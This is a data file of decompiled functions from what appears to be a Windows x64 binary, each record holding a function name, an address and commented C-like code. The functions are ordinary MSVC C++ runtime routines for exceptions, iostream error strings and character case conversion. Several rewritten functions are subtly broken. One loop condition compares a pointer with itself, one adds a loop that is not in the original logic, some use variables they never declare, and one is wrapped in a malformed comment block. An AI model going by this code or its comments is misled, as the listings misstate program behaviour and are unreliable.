{"Function Name": "FUN_140001a4c", "Address": "140001a4c", "Source Code": "\n// Function definition for FUN_140001a4c\nvoid FUN_140001a4c(void)\n{\n    // Initialize locks\n    std::_Init_locks::_Init_locks((_Init_locks *)&locks_init);\n    \n    // Register function to be called at program exit\n    atexit((_func_5014 *)&exit_function);\n}\n"}
{"Function Name": "FUN_140001a90", "Address": "140001a90", "Source Code": "\n// Function definition for FUN_140001a90\nvoid FUN_140001a90(void)\n{\n    // Initialize locks\n    std::_Init_locks::_Init_locks((_Init_locks *)&locks_init);\n    \n    // Register function to be called at program exit\n    atexit((_func_5014 *)&exit_program);\n}\n"}
{"Function Name": "std::exception::exception", "Address": "140001ab0", "Source Code": "\\*\n// Define a member function of the std::exception class with the __thiscall calling convention\nexception * __thiscall std::exception::exception(exception *new_this, exception *new_param_1)\n{\n    // Set the virtual function table pointer of the current object to vftable\n    *(undefined ***)new_this = new_vftable;\n    \n    // Set the value at offset 8 of the current object to 0\n    *(longlong *)(new_this + 8) = 0;\n    \n    // Copy the contents from offset 8 of param_1 to offset 8 of the current object\n    __std_exception_copy((longlong *)(new_param_1 + 8), (longlong *)(new_this + 8));\n    \n    // Return the current object\n    return new_this;\n}\n*\\ \n \nexception * __thiscall std::exception::exception(exception *new_this, exception *new_param_1)\n{\n    *(undefined ***)new_this = new_vftable;\n    *(longlong *)(new_this + 8) = 0;\n    __std_exception_copy((longlong *)(new_param_1 + 8), (longlong *)(new_this + 8));\n    return new_this;\n}"}
{"Function Name": "FUN_140001af0", "Address": "140001af0", "Source Code": "\nchar * get_exception_message(longlong input_param)\n{\n    // Check if the value at offset 8 from param_1 is not equal to NULL\n    if (*(char **)(input_param + 8) != (char *)0x0) {\n        // Return the value at offset 8 from param_1\n        return *(char **)(input_param + 8);\n    }\n    // Return \"Unknown exception\" if the value at offset 8 from param_1 is NULL\n    return \"Unknown exception\";\n}\n"}
{"Function Name": "FUN_140001b10", "Address": "140001b10", "Source Code": "\n// Function definition for FUN_140001b10\nundefined8 *FUN_140001b10(undefined8 *new_param, uint new_value)\n{\n    // Set the first element of param_1 to the vftable of std::exception\n    *new_param = std::exception::vftable;\n    \n    // Call __std_exception_destroy on the element after param_1\n    __std_exception_destroy(new_param + 1);\n    \n    // Check if the least significant bit of param_2 is set\n    if (new_value & 1) {\n        // Call thunk_FUN_14000b460\n        thunk_FUN_14000b460();\n    }\n    \n    // Return param_1\n    return new_param;\n}\n"}
{"Function Name": "FUN_140001b60", "Address": "140001b60", "Source Code": "\n// Function definition for FUN_140001b60\nvoid FUN_140001b60(undefined8 *exception_ptr, longlong input_param)\n{\n    // Local variables\n    undefined1 stack_array[32];\n    ulonglong result = DAT_140038080 ^ (ulonglong)stack_array;\n    undefined1 flag = 1;\n    \n    // Set vftable for std::exception\n    *exception_ptr = std::exception::vftable;\n    exception_ptr[1] = 0;\n    exception_ptr[2] = 0;\n    \n    // Copy param_2 to local_28\n    longlong copy_param = input_param;\n    __std_exception_copy(&copy_param, exception_ptr + 1);\n    \n    // Set vftable for std::runtime_error\n    *exception_ptr = std::runtime_error::vftable;\n    \n    // Security check\n    __security_check_cookie(result ^ (ulonglong)stack_array);\n    \n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_140001bf0", "Address": "140001bf0", "Source Code": "\n// Function that takes an undefined8, an undefined4 pointer, and an undefined4 as parameters\nundefined4 * FUN_140001bf0(undefined8 new_param_1, undefined4 *new_param_2, undefined4 new_param_3)\n{\n    // Assign the value of param_3 to the memory location pointed to by param_2\n    *new_param_2 = new_param_3;\n    \n    // Assign the value of param_1 to the memory location 2 positions ahead of param_2\n    *(undefined8 *)(new_param_2 + 2) = new_param_1;\n    \n    // Return the updated param_2 pointer\n    return new_param_2;\n}\n"}
{"Function Name": "FUN_140001c00", "Address": "140001c00", "Source Code": "\n// Function definition for FUN_140001c00\nundefined8 FUN_140001c00(longlong *new_param1, undefined4 new_param2, int *new_param3)\n{\n    int *new_piVar;\n    \n    // Call function pointer at offset 0x18 of the code pointer stored at param_1\n    new_piVar = (int *)(**(code **)(*new_param1 + 0x18))(new_param1, (undefined1 *)0x18, new_param2);\n    \n    // Check if values at specific offsets in piVar1 and param_3 match\n    if ((*(longlong *)(*(longlong *)(new_piVar + 2) + 8) == *(longlong *)(*(longlong *)(new_param3 + 2) + 8)\n        && (*new_piVar == *new_param3)) {\n        // Return concatenated value of shifted piVar1 and 1\n        return CONCAT71((uint7)((ulonglong)new_piVar >> 8), 1);\n    }\n    \n    // Return shifted value of piVar1\n    return (ulonglong)((uint7)((ulonglong)new_piVar >> 8) << 8);\n}\n"}
{"Function Name": "FUN_140001c40", "Address": "140001c40", "Source Code": "\nlonglong FUN_140001c40(longlong new_param_1, int *new_param_2, int new_param_3)\n{\n    // Extracting the upper 7 bits of the value pointed to by param_2 + 2\n    uint7 new_uVar1 = (uint7)((ulonglong)*(longlong *)(new_param_2 + 2) >> 8);\n    \n    // Checking if the values at specific offsets match and if the first element of param_2 matches param_3\n    if ((*(longlong *)(new_param_1 + 8) == *(longlong *)(*(longlong *)(new_param_2 + 2) + 8)) && (*new_param_2 == new_param_3)) {\n        // Returning a concatenation of uVar1 and 1\n        return CONCAT71(new_uVar1, 1);\n    }\n    \n    // Shifting uVar1 left by 8 bits and returning the result\n    return (ulonglong)new_uVar1 << 8;\n}\n"}
{"Function Name": "FUN_140001c60", "Address": "140001c60", "Source Code": "\n// Function definition for FUN_140001c60\nundefined4 * FUN_140001c60(undefined4 *new_param)\n{\n    // Check the result of FUN_14000962c function\n    if (FUN_14000962c((longlong *)&DAT_14003ad28, &LAB_140008d90, &DAT_14003ad30) != 0) {\n        // Set param_1 to 1\n        *new_param = 1;\n        // Set the value at index 2 of param_1 to the address of DAT_14003ad30\n        *(undefined **)(new_param + 2) = &DAT_14003ad30;\n        // Return param_1\n        return new_param;\n    }\n    // Call terminate function\n    terminate();\n    // Return the result of calling the function at address swi(3)\n    return (undefined4 *)(*(code *)swi(3))();\n}\n"}
{"Function Name": "FUN_140001cb0", "Address": "140001cb0", "Source Code": "\n// Function definition with parameters and local variables\nvoid FUN_140001cb0(undefined8 ****param_1, undefined8 *param_2, undefined8 *param_3)\n{\n    // Variable declarations\n    ulonglong new_uVar1;\n    undefined8 ***new_pppuVar3;\n    undefined8 *****new_pppppuVar4;\n    undefined8 ******new_ppppppuVar5;\n    undefined8 ******new_ppppppuVar6;\n    ulonglong new_uVar7;\n    undefined1 new_auStack_c8[32];\n    \n    // Initialization of local variables\n    new_local_60 = 0xfffffffffffffffe;\n    new_local_38 = DAT_140038080 ^ (ulonglong)new_auStack_c8;\n    new_local_98 = 0;\n    new_uStack_90 = 0;\n    new_uVar1 = param_3[2];\n    \n    // Condition check and modification of param_3\n    if (0xf < (ulonglong)param_3[3]) {\n        param_3 = (undefined8 *)*param_3;\n    }\n    \n    // Condition check and branching\n    if (new_uVar1 < 0x10) {\n        new_local_a8 = (undefined8 *****)*param_3;\n        new_uStack_a0 = param_3[1];\n        new_uVar7 = 0xf;\n        LAB_140001d96:\n        new_local_88 = &new_local_a8;\n        new_local_58 = (undefined8 *****)*param_2;\n        new_uStack_50 = *(undefined4 *)(param_2 + 1);\n        new_uStack_4c = *(undefined4 *)((longlong)param_2 + 0xc);\n        new_local_98 = new_uVar1;\n        new_uStack_90 = new_uVar7;\n        \n        // Function call\n        if (new_uVar1 != 0) {\n            FUN_140007f20(&new_local_a8, &DAT_1400315bc, 2);\n        }\n        \n        // Function pointer call\n        (**(code **)(*(longlong *)CONCAT44(new_uStack_4c, new_uStack_50) + 0x10))\n        ((longlong *)CONCAT44(new_uStack_4c, new_uStack_50), &new_local_58, (ulonglong)new_local_58 & 0xffffffff);\n        \n        new_ppppppuVar5 = &new_local_58;\n        \n        // Condition check and modification of ppppppuVar5\n        if (0xf < local_40) {\n            new_ppppppuVar5 = (undefined8 ******)new_local_58;\n        }\n        \n        // Function call\n        FUN_140007f20(&new_local_a8, new_ppppppuVar5, local_48);\n        \n        // Nested condition check and branching\n        if (0xf < local_40) {\n            if ((0xfff < local_40 + 1) && (0x1f < (ulonglong)((longlong)new_local_58 + (-8 - (longlong)new_local_58[-1])))) {\n                goto LAB_140001f16;\n            }\n            thunk_FUN_14000b460();\n        }\n        \n        // Variable assignments\n        new_uVar1 = new_uStack_90;\n        new_pppppuVar4 = new_local_a8;\n        new_local_80 = new_local_a8;\n        new_uStack_78 = new_uStack_a0;\n        new_local_70 = new_local_98;\n        new_uStack_68 = new_uStack_90;\n        new_local_98 = 0;\n        new_uStack_90 = 0xf;\n        new_local_a8 = (undefined8 *****)((ulonglong)new_local_a8 & 0xffffffffffffff00);\n        new_local_58 = &new_local_80;\n        \n        // Condition check and modification of local_58\n        if (0xf < new_uVar1) {\n            new_local_58 = new_pppppuVar4;\n        }\n        \n        // Memory assignments\n        *param_1 = (undefined8 ***)std::exception::vftable;\n        param_1[1] = (undefined8 ***)0x0;\n        param_1[2] = (undefined8 ***)0x0;\n        new_uStack_50 = CONCAT31(new_uStack_50._1_3_, 1);\n        __std_exception_copy((longlong *)&new_local_58, (longlong *)(param_1 + 1));\n        *param_1 = (undefined8 ***)std::runtime_error::vftable;\n        \n        // Nested condition check and branching\n        if (new_uStack_68 < 0x10) {\n            goto LAB_140001ed8;\n        }\n        \n        if ((new_uStack_68 + 1 < 0x1000) || ((ulonglong)((longlong)new_local_80 + (-8 - (longlong)new_local_80[-1])) < 0x20)) {\n            thunk_FUN_14000b460();\n            goto LAB_140001ed8;\n        }\n    }\n    else {\n        new_uVar7 = new_uVar1 | 0xf;\n        \n        // Condition check and modification of uVar7\n        if (0x7fffffffffffffff < new_uVar7) {\n            new_uVar7 = 0x7fffffffffffffff;\n        }\n        \n        new_ppppppuVar5 = (undefined8 ******)(new_uVar7 + 1);\n        new_local_88 = (undefined8 *****)param_1;\n        \n        // Condition check and branching\n        if (new_ppppppuVar5 < (undefined8 ******)0x1000) {\n            if (new_ppppppuVar5 != (undefined8 ******)0x0) {\n                new_ppppppuVar5 = (undefined8 ******)operator_new((__uint64)new_ppppppuVar5);\n            }\n            LAB_140001d83:\n            new_local_a8 = new_ppppppuVar5;\n            FUN_14000c330(new_ppppppuVar5, param_3, new_uVar1 + 1);\n            goto LAB_140001d96;\n        }\n        \n        new_ppppppuVar6 = (undefined8 ******)(new_uVar7 + 0x28);\n        \n        // Condition check and modification of ppppppuVar6\n        if (new_ppppppuVar6 <= new_ppppppuVar5) {\n            new_ppppppuVar6 = (undefined8 ******)0xffffffffffffffff;\n        }\n        \n        new_pppppuVar4 = (undefined8 *****)operator_new((__uint64)new_ppppppuVar6);\n        \n        // Condition check and branching\n        if (new_pppppuVar4 != (undefined8 *****)0x0) {\n            new_ppppppuVar5 = (undefined8 ******)((longlong)new_pppppuVar4 + 0x27U & 0xffffffffffffffe0);\n            new_ppppppuVar5[-1] = new_pppppuVar4;\n            goto LAB_140001d83;\n        }\n    }\n    \n    // Function calls\n    FUN_14000ed18();\n    \n    LAB_140001f16:\n    FUN_14000ed18();\n    new_pcVar2 = (code *)swi(3);\n    (*new_pcVar2)();\n    return;\n}\n"}
{"Function Name": "FUN_140001f20", "Address": "140001f20", "Source Code": "\n// Function definition for FUN_140001f20\nundefined8 *FUN_140001f20(undefined8 *new_param, uint new_value)\n{\n    // Set the first element of param_1 to the vftable of std::exception\n    *new_param = std::exception::vftable;\n    \n    // Call __std_exception_destroy on the element after param_1\n    __std_exception_destroy(new_param + 1);\n    \n    // Check if the least significant bit of param_2 is set\n    if (new_value & 1) {\n        // Call thunk_FUN_14000b460 if the condition is true\n        thunk_FUN_14000b460();\n    }\n    \n    // Return param_1\n    return new_param;\n}\n"}
{"Function Name": "FUN_140001f70", "Address": "140001f70", "Source Code": "\n// Function definition for FUN_140001f70\nchar * getLibraryName(void)\n{\n    return \"iostream\"; // Return the string \"iostream\"\n}\n"}
{"Function Name": "FUN_140001f80", "Address": "140001f80", "Source Code": "\n// Function definition for FUN_140001f80\nlonglong * FUN_140001f80(undefined8 new_param_1, longlong *new_param_2, int new_param_3)\n{\n    // Check if param_3 is equal to 1\n    if (new_param_3 == 1) {\n        // Set values for param_2 array elements\n        new_param_2[2] = 0;\n        new_param_2[3] = 0xf;\n        *(undefined1 *)new_param_2 = 0;\n        \n        // Call function FUN_140007dc0 with parameters param_2 and \"iostream stream error\"\n        FUN_140007dc0(new_param_2, (undefined8 *)\"iostream stream error\", 0x15);\n        \n        // Return param_2\n        return new_param_2;\n    }\n    \n    // Call function FUN_140009ca8 with parameter param_3 and store the result in pcVar1\n    char *new_pcVar1 = FUN_140009ca8(new_param_3);\n    \n    // Set values for param_2 array elements\n    new_param_2[2] = 0;\n    new_param_2[3] = 0xf;\n    *(undefined1 *)new_param_2 = 0;\n    \n    // Initialize uVar2 to 0\n    ulonglong new_uVar2 = 0;\n    \n    // Loop through pcVar1 until null terminator is found\n    while (new_pcVar1[new_uVar2] != '\\0') {\n        new_uVar2++;\n    }\n    \n    // Call function FUN_140007dc0 with parameters param_2, pcVar1, and uVar2\n    FUN_140007dc0(new_param_2, (undefined8 *)new_pcVar1, new_uVar2);\n    \n    // Return param_2\n    return new_param_2;\n}\n"}
{"Function Name": "FUN_140002000", "Address": "140002000", "Source Code": "\n// Function definition for FUN_140002000\nundefined8 FUN_140002000(undefined8 new_param, ulonglong new_value)\n{\n    // Check if the least significant bit of param_2 is set\n    if (new_value & 1) {\n        // Call the function thunk_FUN_14000b460\n        thunk_FUN_14000b460();\n    }\n    // Return param_1\n    return new_param;\n}\n"}
{"Function Name": "FUN_140002030", "Address": "140002030", "Source Code": "\nundefined8 *FUN_140002030(undefined8 *new_param)\n{\n    // Set the value at index 2 of param_1 to 0\n    new_param[2] = 0;\n    \n    // Set the value at index 1 of param_1 to the string \"bad cast\"\n    new_param[1] = \"bad cast\";\n    \n    // Set the value pointed to by param_1 to the address of the vftable of std::bad_cast\n    *new_param = std::bad_cast::vftable;\n    \n    // Return param_1\n    return new_param;\n}\n"}
{"Function Name": "FUN_140002060", "Address": "140002060", "Source Code": "\n// Function definition for FUN_140002060\nundefined8 *FUN_140002060(undefined8 *new_param, ulonglong new_value)\n{\n    // Set the value at the memory location pointed by param_1 to the vftable of std::_Facet_base\n    *new_param = std::_Facet_base::vftable;\n\n    // Check if the least significant bit of param_2 is set\n    if (new_value & 1) {\n        // Call the function thunk_FUN_14000b460\n        thunk_FUN_14000b460();\n    }\n\n    // Return the updated param_1\n    return new_param;\n}\n"}
{"Function Name": "FUN_140002090", "Address": "140002090", "Source Code": "\nvoid FUN_140002090(longlong input_param)\n{\n    // Acquire lock before modifying the shared data\n    LOCK();\n\n    // Increment the value at the memory location offset by 8 from param_1\n    *(int *)(input_param + 8) += 1;\n\n    // Release the lock after modifying the shared data\n    UNLOCK();\n\n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_1400020a0", "Address": "1400020a0", "Source Code": "\nlonglong FUN_1400020a0(longlong param_1)\n{\n    LOCK(); // Acquire lock\n\n    int *ptrInt = (int *)(param_1 + 8); // Get the integer value at offset 8 from param_1\n    *ptrInt = *ptrInt + -1; // Decrement the value at piVar1\n\n    UNLOCK(); // Release lock\n\n    if (*ptrInt == 0) { // Check if the value at piVar1 is 0\n        return param_1; // Return param_1 if the value is 0\n    }\n\n    return 0; // Return 0 if the value is not 0\n}\n"}
{"Function Name": "FUN_1400020b0", "Address": "1400020b0", "Source Code": "\nvoid new_function(longlong input_param)\n{\n    // Check if the value at offset 8 from param_1 is not equal to 0x0\n    if (*(longlong **)(input_param + 8) != (longlong *)0x0) {\n        // Check if the function pointer at offset 0x10 from the value at offset 8 from param_1 is not equal to 0x0\n        if ((**(code **)(**(longlong **)(input_param + 8) + 0x10))() != (undefined8 *)0x0) {\n            // Call the function pointer at offset 0x10 from the value at offset 8 from param_1 with argument 1\n            (**(code **)(**(code **)(**(longlong **)(input_param + 8) + 0x10))())(1);\n        }\n    }\n}\n"}
{"Function Name": "FUN_1400020e0", "Address": "1400020e0", "Source Code": "\n// Function definition for FUN_1400020e0\nundefined8 FUN_1400020e0(longlong *param_1, longlong param_2)\n{\n    longlong new_lVar1;  // Variable to store a longlong value\n    code *new_pcVar2;  // Pointer to a code object\n    undefined8 *new_puVar3;  // Pointer to an undefined8 value\n    UINT *new_pUVar4;  // Pointer to a UINT value\n    undefined8 new_uVar5;  // Variable to store an undefined8 value\n    char *new_pcVar6;  // Pointer to a char value\n    _Lockit new_local_a8 [8];  // Array of _Lockit objects\n    LPVOID new_local_a0;  // Pointer to a LPVOID value\n    LPVOID new_local_90;  // Pointer to a LPVOID value\n    LPVOID new_local_80;  // Pointer to a LPVOID value\n    LPVOID new_local_70;  // Pointer to a LPVOID value\n    LPVOID new_local_60;  // Pointer to a LPVOID value\n    LPVOID new_local_50;  // Pointer to a LPVOID value\n\n    // Check if param_1 is not NULL and the value it points to is 0\n    if ((param_1 != (longlong *)0x0) && (*param_1 == 0)) {\n        // Allocate memory for an undefined8 object\n        new_puVar3 = (undefined8 *)operator_new(0x30);\n        // Get a longlong value from param_2 and determine the value of pcVar6 based on conditions\n        new_lVar1 = *(longlong *)(param_2 + 8);\n        new_pcVar6 = (new_lVar1 == 0) ? \"\" : (*(char **)(new_lVar1 + 0x28) == (char *)0x0 ? (char *)(new_lVar1 + 0x30) : *(char **)(new_lVar1 + 0x28);\n        // Initialize a _Lockit object\n        std::_Lockit::_Lockit(new_local_a8, 0);\n        // Construct a _Locinfo object with the given parameters\n        std::_Locinfo::_Locinfo_ctor((_Locinfo *)new_local_a8, new_pcVar6);\n        // Set values in the puVar3 object\n        *(undefined4 *)(new_puVar3 + 1) = 0;\n        *new_puVar3 = std::ctype<char>::vftable;\n        // Call function FUN_140009cd0 and assign values to puVar3\n        new_pUVar4 = FUN_140009cd0(local_38);\n        new_uVar5 = *(undefined8 *)(new_pUVar4 + 2);\n        new_puVar3[2] = *(undefined8 *)new_pUVar4;\n        new_puVar3[3] = new_uVar5;\n        new_uVar5 = *(undefined8 *)(new_pUVar4 + 6);\n        new_puVar3[4] = *(undefined8 *)(new_pUVar4 + 4);\n        new_puVar3[5] = new_uVar5;\n        // Assign the puVar3 object to param_1\n        *param_1 = (longlong)new_puVar3;\n        // Destruct the _Locinfo object\n        std::_Locinfo::_Locinfo_dtor((_Locinfo *)new_local_a8);\n        // Loop through and perform operations on local_50\n        for (int i = 0; i < 6; i++) {\n            if (new_local_50 != (LPVOID)0x0) {\n                FUN_14000ead0(new_local_50);\n                new_local_50 = (LPVOID)0x0;\n            }\n        }\n        // Destruct the _Lockit object\n        std::_Lockit::~_Lockit(new_local_a8);\n    }\n    // Return value 2\n    return 2;\n}\n"}
{"Function Name": "std::ctype<char>::do_tolower", "Address": "140002280", "Source Code": "\n// This function is a member function of the std::ctype class that converts a character to lowercase.\nchar __thiscall std::ctype<char>::do_tolower(ctype<char> *this, char character_to_convert)\n{\n    // Convert the character to lowercase using _Tolower function with the help of this pointer offset by 0x10.\n    return (char)_Tolower((uint)(byte)character_to_convert, (_Ctypevec *)(this + 0x10));\n}\n"}
{"Function Name": "FUN_140002290", "Address": "140002290", "Source Code": "\n// Function to convert characters in the range [param_2, param_3) to lowercase\nbyte * FUN_140002290(longlong new_param_1, byte *new_param_2, byte *new_param_3)\n{\n    // Calculate the length of the range\n    longlong new_lVar2 = (longlong)new_param_3 - (longlong)new_param_2;\n    \n    // If param_3 is less than param_2, set length to 0\n    if (new_param_3 < new_param_2) {\n        new_lVar2 = 0;\n    }\n    \n    // Convert characters to lowercase within the range\n    if (new_lVar2 != 0) {\n        do {\n            *new_param_2 = (byte)_Tolower((uint)*new_param_2, (_Ctypevec *)(new_param_1 + 0x10));\n            new_param_2++;\n            new_lVar2--;\n        } while (new_lVar2 != 0);\n    }\n    \n    // Return the updated param_2 pointer\n    return new_param_2;\n}\n"}
{"Function Name": "FUN_1400022af", "Address": "1400022af", "Source Code": "\n// Function to convert characters to lowercase\nbyte * FUN_1400022af(longlong param_1)\n{\n    byte *current_byte;    // Pointer to the current byte\n    longlong end_of_byte_array; // End of the byte array\n    longlong current_index; // Current index in the byte array\n\n    // Loop through each byte in the array\n    do {\n        // Convert the byte to lowercase\n        *current_byte = (byte)_Tolower((uint)*current_byte,(_Ctypevec *)(param_1 + 0x10));\n        current_index++; // Move to the next index\n        current_byte++; // Move to the next byte\n    } while (current_index != end_of_byte_array); // Continue until reaching the end of the array\n\n    return current_byte; // Return the pointer to the next byte\n}\n"}
{"Function Name": "std::ctype<char>::do_toupper", "Address": "1400022f0", "Source Code": "\n// Function to convert a character to uppercase using the _Toupper function\nchar __thiscall std::ctype<char>::do_toupper(ctype<char> *character_type, char character_to_convert)\n{\n    // Casting the character to unsigned int and byte before passing to _Toupper function\n    return (char)_Toupper((uint)(byte)character_to_convert, (_Ctypevec *)(character_type + 0x10));\n}\n"}
{"Function Name": "FUN_140002300", "Address": "140002300", "Source Code": "\nbyte * FUN_140002300(longlong new_param_1,byte *new_param_2,byte *new_param_3)\n{\n    // Calculate the difference between param_3 and param_2\n    longlong new_lVar2 = (longlong)new_param_3 - (longlong)new_param_2;\n    \n    // If param_3 is less than param_2, set the difference to 0\n    if (new_param_3 < new_param_2) {\n        new_lVar2 = 0;\n    }\n    \n    // If the difference is not 0, iterate through the elements\n    if (new_lVar2 != 0) {\n        do {\n            // Convert the element to uppercase using _Toupper function\n            *new_param_2 = (byte)_Toupper((uint)*new_param_2,(_Ctypevec *)(new_param_1 + 0x10));\n            new_param_2++;\n            new_lVar2--;\n        } while (new_lVar2 != 0);\n    }\n    \n    // Return the updated param_2 pointer\n    return new_param_2;\n}\n"}
{"Function Name": "FUN_14000231f", "Address": "14000231f", "Source Code": "\nbyte * FUN_14000231f(longlong memory_block_pointer)\n{\n    int uppercase_byte;\n    byte *current_byte_pointer;\n\n    // Loop through each byte in the memory block\n    do {\n        // Convert the byte to uppercase using _Toupper function\n        uppercase_byte = _Toupper((uint)*current_byte_pointer,(_Ctypevec *)(memory_block_pointer + 0x10));\n        // Store the uppercase byte back in memory\n        *current_byte_pointer = (byte)uppercase_byte;\n        // Move to the next byte in memory\n        current_byte_pointer++;\n    } while (++memory_block_pointer != memory_block_pointer); // Continue looping until param_1 is equal to itself\n\n    return current_byte_pointer; // Return the pointer to the next memory location\n}\n"}
{"Function Name": "FUN_140002360", "Address": "140002360", "Source Code": "\n// Function definition for FUN_140002360\nundefined1 FUN_140002360(undefined8 input_value, undefined1 output_value)\n{\n    return output_value; // Return the value of param_2\n}\n"}
{"Function Name": "FUN_140002370", "Address": "140002370", "Source Code": "\n// Function definition for FUN_140002370\nlonglong FUN_140002370(undefined8 new_param_1, undefined8 *new_param_2, longlong new_param_3, undefined8 *new_param_4)\n{\n    // Call function FUN_14000c330 with parameters param_4, param_2, and the result of param_3 - (longlong)param_2\n    FUN_14000c330(new_param_4, new_param_2, new_param_3 - (longlong)new_param_2);\n    \n    // Return the original param_3 value\n    return new_param_3;\n}\n"}
{"Function Name": "FUN_140002390", "Address": "140002390", "Source Code": "\n// Function definition for FUN_140002390\nlonglong FUN_140002390(undefined8 param_1, undefined8 *param_2, longlong param_3, undefined8 param_4, undefined8 *param_5)\n{\n    // Call function FUN_14000c330 with parameters param_5, param_2, and the result of param_3 - (longlong)param_2\n    FUN_14000c330(param_5, param_2, param_3 - (longlong)param_2);\n    \n    // Return the value of param_3\n    return param_3;\n}\n"}
{"Function Name": "std::ctype<char>::`scalar_deleting_destructor'", "Address": "1400023b0", "Source Code": "\n// Destructor for std::ctype<char> class\nvoid * __thiscall std::ctype<char>::_scalar_deleting_destructor_(ctype<char> *new_this, uint new_param_1)\n{\n    // Set vftable pointer\n    *(undefined ***)new_this = new_vftable;\n\n    // Check if the value at offset 0x20 is less than 1\n    if (*(int *)(new_this + 0x20) < 1) {\n        // If value at offset 0x20 is less than 0, call thunk_FUN_14000b460\n        if (*(int *)(new_this + 0x20) < 0) {\n            thunk_FUN_14000b460();\n        }\n    }\n    else {\n        // Call FUN_14000ead0 with the value at offset 0x18\n        FUN_14000ead0(*(LPVOID *)(new_this + 0x18));\n    }\n\n    // Call FUN_14000ead0 with the value at offset 0x28\n    FUN_14000ead0(*(LPVOID *)(new_this + 0x28));\n\n    // Set vftable pointer to _Facet_base::vftable\n    *(undefined ***)new_this = new_Facet_base::new_vftable;\n\n    // Check if the least significant bit of param_1 is set\n    if ((new_param_1 & 1) != 0) {\n        // Call thunk_FUN_14000b460\n        thunk_FUN_14000b460();\n    }\n\n    // Return the modified this pointer\n    return new_this;\n}\n"}
{"Function Name": "FUN_140002420", "Address": "140002420", "Source Code": "\n// Function definition with parameters and return type\nundefined8 **** FUN_140002420(undefined8 ****param_1, undefined8 *param_2, undefined8 *param_3)\n{\n    undefined8 ****new_ppppuVar3; // Declare variable ppppuVar3\n    ulonglong new_uVar4; // Declare variable uVar4\n    undefined8 new_uVar2; // Declare variable uVar2\n    \n    // Assign value to ppppuVar3 and uVar2\n    new_ppppuVar3 = (undefined8 ****)*param_3;\n    new_uVar2 = param_3[1];\n    \n    new_uVar4 = 0; // Initialize uVar4 to 0\n    // Loop to find the length of param_2 string\n    while (*(char *)((longlong)param_2 + new_uVar4) != '\\0') {\n        new_uVar4++;\n    }\n    \n    // Call function FUN_140007dc0 with parameters\n    FUN_140007dc0((longlong *)&local_48, param_2, new_uVar4);\n    \n    // Call function FUN_140001cb0 with parameters\n    FUN_140001cb0(param_1, &new_ppppuVar3, (undefined8 *)&local_48);\n    \n    // Check conditions and call functions based on conditions\n    if (0xf < uStack_30) {\n        if ((0xfff < uStack_30 + 1) &&\n            (0x1f < (CONCAT71(uStack_47, local_48) - *(longlong *)(CONCAT71(uStack_47, local_48) + -8)) - 8U)) {\n            FUN_14000ed18();\n            thunk_FUN_14000b460();\n        }\n    }\n    \n    // Assign value to param_1 and return it\n    *param_1 = (undefined8 ***)std::ios_base::failure::vftable;\n    return param_1;\n}\n"}
{"Function Name": "FUN_1400024f0", "Address": "1400024f0", "Source Code": "\n// Function definition with parameters param_1, param_2, and param_3\nvoid FUN_1400024f0(longlong memory_address, uint bitwise_value, char char_value)\n{\n    uint bitwise_result; // Variable to store bitwise operation result\n    char *char_pointer; // Pointer to character variable\n\n    // Store param_2 bitwise AND 0x17 at offset 0x10 of param_1\n    *(uint *)(memory_address + 0x10) = bitwise_value & 0x17;\n    \n    // Perform bitwise AND operation on values at offset 0x14 of param_1 and param_2, store result in uVar2\n    bitwise_result = *(uint *)(memory_address + 0x14) & bitwise_value & 0x17;\n    \n    // Check if uVar2 is 0, return if true\n    if (bitwise_result == 0) {\n        return;\n    }\n    \n    // Check if param_3 is not null character\n    if (char_value != '\\0') {\n        // Call function FUN_14000c234 with parameters\n        FUN_14000c234((longlong *)0x0, (byte *)0x0);\n        code *function_pointer = (code *)swi(3); // Software interrupt call\n        (*function_pointer)(); // Call function pointer\n        return;\n    }\n    \n    // Check if bitwise AND of uVar2 and 4 is 0\n    if ((bitwise_result & 4) == 0) {\n        char_pointer = \"ios_base::failbit set\"; // Set pcVar4 to string\n        // Check if bitwise AND of uVar2 and 2 is 0\n        if ((bitwise_result & 2) == 0) {\n            char_pointer = \"ios_base::eofbit set\"; // Update pcVar4 to different string\n        }\n    } else {\n        char_pointer = \"ios_base::badbit set\"; // Set pcVar4 to different string\n    }\n    \n    // Call function FUN_140002420 with parameters\n    FUN_140002420((undefined8 ***)local_38, (undefined8 *)char_pointer, (undefined8 *)FUN_140001c60(local_48));\n    FUN_14000c234((longlong *)local_38, &DAT_140036210); // Call function FUN_14000c234\n    code *function_pointer = (code *)swi(3); // Software interrupt call\n    (*function_pointer)(); // Call function pointer\n}\n"}
{"Function Name": "FUN_140002570", "Address": "140002570", "Source Code": "\n// Function to copy exception information to a new location\nundefined8 * FUN_140002570(undefined8 *exception_info,longlong offset)\n{\n    // Set vftable of std::exception to the first element of param_1\n    *exception_info = std::exception::vftable;\n    \n    // Initialize the second element of param_1 to 0\n    exception_info[1] = 0;\n    \n    // Initialize the third element of param_1 to 0\n    exception_info[2] = 0;\n    \n    // Copy exception information from param_2 to param_1 starting from offset 8\n    copy_exception_data((longlong *)(offset + 8),exception_info + 1);\n    \n    // Set vftable of std::_System_error to the first element of param_1\n    *exception_info = std::_System_error::vftable;\n    \n    // Copy data from param_2 offset 0x18 to the fourth element of param_1\n    exception_info[3] = *(undefined8 *)(offset + 0x18);\n    \n    // Copy data from param_2 offset 0x20 to the fifth element of param_1\n    exception_info[4] = *(undefined8 *)(offset + 0x20);\n    \n    // Return the updated param_1\n    return exception_info;\n}\n"}
{"Function Name": "FUN_1400025d0", "Address": "1400025d0", "Source Code": "\n// Function to copy exception information to a new location\nundefined8 *FUN_1400025d0(undefined8 *new_param, longlong new_value)\n{\n    // Set the virtual function table pointer for std::exception\n    *new_param = std::exception::vftable;\n    // Initialize the second element to 0\n    new_param[1] = 0;\n    // Initialize the third element to 0\n    new_param[2] = 0;\n    // Copy exception information from source to destination\n    __std_exception_copy((longlong *)(new_value + 8), new_param + 1);\n    // Set the virtual function table pointer for std::_System_error\n    *new_param = std::_System_error::vftable;\n    // Copy data from source to destination for the third element\n    new_param[3] = *(undefined8 *)(new_value + 0x18);\n    // Copy data from source to destination for the fourth element\n    new_param[4] = *(undefined8 *)(new_value + 0x20);\n    // Return the modified parameter 1\n    return new_param;\n}\n"}
